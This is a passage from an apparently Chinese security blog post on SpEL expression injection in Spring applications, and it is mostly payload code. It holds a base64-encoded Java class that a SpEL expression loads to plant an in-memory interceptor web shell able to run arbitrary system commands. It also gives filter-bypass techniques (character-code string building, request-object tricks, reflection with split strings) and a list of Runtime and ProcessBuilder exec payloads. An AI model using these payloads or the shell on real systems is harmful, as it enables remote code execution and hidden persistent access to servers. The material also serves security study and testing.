class-name">BwDLDADRANIBAANnYmsHAMwMANMA1AwA1QDWAQAAAQAHb3MubmFtZQcA1wwA2ADSDADZANoBAAN3aW4MANsA3AEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMAD0A3QEACS9iaW4vYmFzaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAN4A3wcA4AwA4QDiDAA9AOMBAA13b2Nhb3NpbmlkZW1hDADkAOUMAOYA5wwA6ADaDADpAD4HAM4MAOoA1AwA6wA</span><span class="token operator">+</span><span class="token class-name">AQATamF2YS9sYW5nL0V4Y2VwdGlvbgwA7AA</span><span class="token operator">+</span><span class="token class-name">DABjAGQMAGcAaAwA7QDuAQAGc3RhYXJ0BwDvBwDwDADxAPIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAPMMAPQA9QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA9gD3AQA</span><span class="token operator">+</span>b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwD4DAD5APoBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HANAMAPsA<span class="token operator">/</span><span class="token class-name">AwA</span><span class="token operator">/</span><span class="token constant">QD</span><span class="token operator">+</span><span class="token class-name">AQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAEEluY2VwdG9yTWVtU2hlbGwMAP8BAAEAAm9rAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAUc2V0Q2hhcmFjdGVyRW5jb2RpbmcBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAKihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9sYW5nL1N0cmluZzspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAdwcmludGxuAQAFZmx1c2gBAA9wcmludFN0YWNrVHJhY2UBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoAIQA3ADsAAQA8AAAABwABAD0APgABAD8AAAAvAAEAAQAAAAUqtwABsQAAAAIAQAAAAAYAAQAAABIAQQAAAAwAAQAAAAUAQgBDAAAAAQBEAEUAAwA</span><span class="token operator">/</span><span class="token class-name">AAACBQAGAAkAAAC</span><span class="token operator">+</span><span class="token class-name">KxICuQADAgA6BBkExgCwLBIEuQAFAgAsuQAGAQA6BRIHOgcSCLgACbYAChILtgAMmQAiuwANWQa9AA5ZAxIPU1kEEhBTWQUZBFO3ABE6BqcAH7sADVkGvQAOWQMSElNZBBITU1kFGQRTtwAROga7ABRZGQa2ABW2ABYSBLcAFxIYtgAZOggZCLYAGpkACxkItgAbpwAFGQc6BxkItgAcGQUZB7YAHRkFtgAeGQW2AB</span><span class="token operator">+</span>nAAo6BRkFtgAhA6wErAABAA8AsACzACAAAwBAAAAATgATAAAALQAKAC4ADwAwABcAMQAfADMAIwA0ADMANQBSADcAbgA5AIYAOgCaADsAnwA8AKYAPQCrAD4AsABBALMAPwC1AEAAugBCALwARABBAAAAcAALAE8AAwBGAEcABgAfAJEASABJAAUAbgBCAEYARwAGACMAjQBKAEsABwCGACoATABNAAgAtQAFAE4ATwAFAAAAvgBCAEMAAAAAAL4AUABRAAEAAAC<span class="token operator">+</span><span class="token class-name">AFIAUwACAAAAvgBUAFUAAwAKALQAVgBLAAQAVwAAAGMAB</span><span class="token operator">/</span><span class="token number">8</span>AUgAIBwBYBwBZBwBaBwBbBwBcBwBdAAcAXAAA<span class="token operator">/</span>wAbAAgHAFgHAFkHAFoHAFsHAFwHAF0HAF4HAFwAAPwAJwcAX0EHAFz<span class="token operator">/</span><span class="token class-name">ABoABQcAWAcAWQcAWgcAWwcAXAABBwBgBgEAYQAAAAQAAQAgAGIAAAANAwBQAAAAUgAAAFQAAAABAGMAZAADAD8AAABgAAUABQAAAAoqKywtGQS3ACKxAAAAAgBAAAAACgACAAAASQAJAEoAQQAAADQABQAAAAoAQgBDAAAAAAAKAFAAUQABAAAACgBSAFMAAgAAAAoAVABVAAMAAAAKAGUAZgAEAGEAAAAEAAEAIABiAAAAEQQAUAAAAFIAAABUAAAAZQAAAAEAZwBoAAMAPwAAAGAABQAFAAAACiorLC0ZBLcAI7EAAAACAEAAAAAKAAIAAABOAAkATwBBAAAANAAFAAAACgBCAEMAAAAAAAoAUABRAAEAAAAKAFIAUwACAAAACgBUAFUAAwAAAAoAaQBPAAQAYQAAAAQAAQAgAGIAAAARBABQAAAAUgAAAFQAAABpAAAAAQBqAGsAAwA</span><span class="token operator">/</span><span class="token class-name">AAAAPwAAAAMAAAABsQAAAAIAQAAAAAYAAQAAAFQAQQAAACAAAwAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQBuAG8AAgBhAAAABAABAHAAYgAAAAkCAGwAAABuAAAAAQBqAHEAAwA</span><span class="token operator">/</span><span class="token class-name">AAAASQAAAAQAAAABsQAAAAIAQAAAAAYAAQAAAFkAQQAAACoABAAAAAEAQgBDAAAAAAABAGwAbQABAAAAAQByAHMAAgAAAAEAVAB0AAMAYQAAAAQAAQBwAGIAAAANAwBsAAAAcgAAAFQAAAAIAHUAPgABAD8AAAFpAAMABQAAAGqyACQSJbYAJrgAJxIoA7kAKQMAwAAqSyoSK7kALAIAwAArTAFNEi0SLrYAL02nAAhOLbYAMSwEtgAyAU4sK7YAM8AANE6nAAo6BBkEtgA2uwA3WbcAODoELRkEuQA5AgBXsgAkEjq2ACaxAAIAJQAtADAAMAA8AEUASAA1AAQAQAAAAEoAEgAAABUACAAWABcAFwAjABgAJQAaAC0AHQAwABsAMQAcADUAHgA6AB8APAAhAEUAJABIACIASgAjAE8AJQBYACYAYQAnAGkAKABBAAAASAAHADEABABOAHYAAwBKAAUATgB3AAQAFwBSAHgAeQAAACMARgB6AHsAAQAlAEQAfAB9AAIAPAAtAH4AfwADAFgAEQCAAEMABACBAAAADAABADwALQB</span><span class="token operator">+</span><span class="token class-name">AIIAAwBXAAAALQAE</span><span class="token operator">/</span>wAwAAMHAIMHAIQHAIUAAQcAhgT<span class="token operator">/</span><span class="token class-name">ABIABAcAgwcAhAcAhQcAhwABBwCIBgABAIkAAAACAIo</span><span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/19/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719225734878.png" alt="image-20240719225734878"></p><hr><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>T(String).getName</code>返回的是<code>java.lang.String</code>，然后用replace替换获取想要的字符串，这种比较麻烦。</p><p>还有一种就是直接使用类似<code>chr</code>函数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="外部对象request"><a href="#外部对象request" class="headerlink" title="外部对象request"></a>外部对象request</h3><p>假如上下文中有request对象的话就也有几种方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//request.getMethod()为POST</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//request.getMethod()为GET</span>#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>b#request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token comment">//Cookie</span>#request<span class="token punctuation">.</span><span class="token function">getRequestedSessionId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="反射-字符串拼贴"><a href="#反射-字符串拼贴" class="headerlink" title="反射+字符串拼贴"></a>反射+字符串拼贴</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>newString<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ban了getSuperClass</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>''<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="部分poc整理"><a href="#部分poc整理" class="headerlink" title="部分poc整理"></a>部分poc整理</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// PoC原型</span><span class="token comment">// Runtime</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// ProcessBuilder</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token char">'calc'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token comment">// Bypass技巧</span><span class="token comment">// 反射调用</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// 同上，需要有上下文环境</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token 